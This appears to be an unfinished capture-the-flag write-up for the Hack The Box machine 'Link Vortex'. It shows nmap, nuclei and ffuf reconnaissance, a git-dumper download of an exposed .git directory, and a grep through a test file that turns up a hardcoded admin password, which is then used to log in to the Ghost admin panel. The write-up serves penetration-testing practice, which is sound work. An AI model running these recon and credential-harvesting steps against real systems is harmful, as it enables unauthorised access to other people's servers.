# Link Vortex
OS: Linux\
Difficulty: Easy

## Steps
### Recon
```Bash
┌─[us-vip-2]─[10.10.14.28]─[gntsqid@htb-tnbwsejwe9]─[~]
└──╼ [★]$ nmap -T5 -p- --min-rate=1500 -sV -Pn link.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-13 18:25 CST
Warning: 10.10.11.47 giving up on port because retransmission cap hit (2).
Nmap scan report for link.htb (10.10.11.47)
Host is up (0.066s latency).
Not shown: 65519 closed tcp ports (reset)
PORT      STATE    SERVICE  VERSION
22/tcp    open     ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http     Apache httpd
1348/tcp  filtered bbn-mmx
1733/tcp  filtered siipat
2013/tcp  filtered raid-am
2201/tcp  filtered ats
2528/tcp  filtered ncr_ccl
4006/tcp  filtered pxc-spvr
14694/tcp filtered unknown
18538/tcp filtered unknown
25819/tcp filtered unknown
44727/tcp filtered unknown
48458/tcp filtered unknown
54561/tcp filtered unknown
58325/tcp filtered unknown
58916/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.13 seconds
```
quick UDP scan for sanity: nothing found.

![image](https://github.com/user-attachments/assets/cb81c675-361f-4ffa-a6c5-100cb560bd92)

Running Nuclei:
```Bash
┌─[us-vip-2]─[10.10.14.28]─[gntsqid@htb-mnlibwppso]─[~]
└──╼ [★]$ nuclei -target http://10.10.11.47

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v2.9.14

		projectdiscovery.io

[INF] nuclei-templates are not installed, installing...
[INF] Successfully installed nuclei-templates at /home/gntsqid/.local/nuclei-templates
[WRN] Found 1113 templates with syntax error (use -validate flag for further examination)
[INF] Current nuclei version: v2.9.14 (outdated)
[INF] Current nuclei-templates version: v10.1.1 (latest)
[INF] New templates added in latest release: 154
[INF] Templates loaded for current scan: 8428
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1717 (Reduced 1607 Requests)
[INF] Using Interactsh Server: oast.online
[waf-detect:apachegeneric] [http] [info] http://10.10.11.47/
[missing-sri] [http] [info] http://linkvortex.htb/ [https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js]
[INF] Skipped 10.10.11.47:80 from target list as found unresponsive 30 times
```
FFUF:
```Bash
┌─[us-vip-2]─[10.10.14.28]─[gntsqid@htb-mnlibwppso]─[~]
└──╼ [★]$ ffuf -u http://linkvortex.htb -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.linkvortex.htb" -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://linkvortex.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.linkvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 72ms]
:: Progress: [100000/100000] :: Job [1/1] :: 617 req/sec :: Duration: [0:02:43] :: Errors: 0 ::
```
we can see as a result we have *dev.linkvortex.htb*\
![image](https://github.com/user-attachments/assets/922226cb-b96e-45d6-91b5-848fa3aaba76)

Going to use [git dumper](https://github.com/arthaud/git-dumper) for the next part:
```Bash
pip3 install git-dumper
```
```Bash
┌─[us-vip-2]─[10.10.14.28]─[gntsqid@htb-mnlibwppso]─[~]
└──╼ [★]$ mkdir git-dumper
┌─[us-vip-2]─[10.10.14.28]─[gntsqid@htb-mnlibwppso]─[~]
└──╼ [★]$ git-dumper http://dev.linkvortex.htb/.git ./git-dumper/
[-] Testing http://dev.linkvortex.htb/.git/HEAD [200]
[-] Testing http://dev.linkvortex.htb/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://dev.linkvortex.htb/.gitignore [404]
[-] http://dev.linkvortex.htb/.gitignore responded with status code 404
[-] Fetching http://dev.linkvortex.htb/.git/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/HEAD [200]
[-] Fetching http://dev.linkvortex.htb/.git/description [200]
[-] Fetching http://dev.linkvortex.htb/.git/config [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/logs/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/info/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/packed-refs [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/shallow [200]
[-] Fetching http://dev.linkvortex.htb/.git/index [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/tags/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/logs/HEAD [200]
[-] Fetching http://dev.linkvortex.htb/.git/info/exclude [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/fsmonitor-watchman.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/post-update.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-commit.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-merge-commit.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-push.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/push-to-checkout.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-receive.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/update.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/50/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/e6/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/tags/v5.57.3 [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/50/864e0261278525197724b394ed4292414d9fec [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/e6/54b0ed7f9c9aedf3180ee1fd94e7e43b29f000 [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/pack-0b802d170fe45db10157bb8e02bfc9397d5e9d87.pack [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/pack-0b802d170fe45db10157bb8e02bfc9397d5e9d87.idx [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 5596 paths from the index
```
```Bash
┌─[us-vip-2]─[10.10.14.28]─[gntsqid@htb-mnlibwppso]─[~/git-dumper]
└──╼ [★]$ ls
apps  Dockerfile.ghost  ghost  LICENSE  nx.json  package.json  PRIVACY.md  README.md  SECURITY.md  yarn.lock
```
We see that *Ghost* is being used.
```Bash
┌─[us-vip-2]─[10.10.14.28]─[gntsqid@htb-mnlibwppso]─[~/git-dumper]
└──╼ [★]$ cat authentication.test.js|grep -i pass -B 1
cat: authentication.test.js: No such file or directory
┌─[us-vip-2]─[10.10.14.28]─[gntsqid@htb-mnlibwppso]─[~/git-dumper]
└──╼ [★]$ find ./ -name "authentication.test.js"
./ghost/core/test/regression/api/admin/authentication.test.js
┌─[us-vip-2]─[10.10.14.28]─[gntsqid@htb-mnlibwppso]─[~/git-dumper]
└──╼ [★]$ cat ./ghost/core/test/regression/api/admin/authentication.test.js | grep -i pass -B 1
            const email = 'test@example.com';
            const password = 'OctopiFociPilfer45';
--
                        email,
                        password,
```
We can see credentials *admin:OctopiFociPilfer45*

Go to *http://linkvortex.htb/ghost/* and sign in with the above creds:\
![image](https://github.com/user-attachments/assets/efaa1e81-862c-43f3-8db5-d1ae1c11afe5)
















